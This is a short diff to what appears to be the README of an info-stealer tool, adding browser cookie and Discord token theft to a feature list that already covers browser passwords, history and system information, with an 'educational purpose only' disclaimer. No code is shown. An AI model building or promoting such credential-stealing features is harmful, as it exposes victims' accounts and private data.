@@ -27,8 +27,12 @@
     5) Gather Browser History
     6) Gather Browser Passwords
     7) Gather System Information
-    8) Data Encryption
-    9) Cross-Platform Compatibility
+    8) Gather Browser Cookies
+    9) Gather Discord Token/s
+    10) Data Encryption
+    11) Cross-Platform Compatibility
+    12) Error Handling and Validation
+    
 
 # Warning:-
     Use this tool Only for Educational Purpose And I will Not be Responsible For ur cruel act.
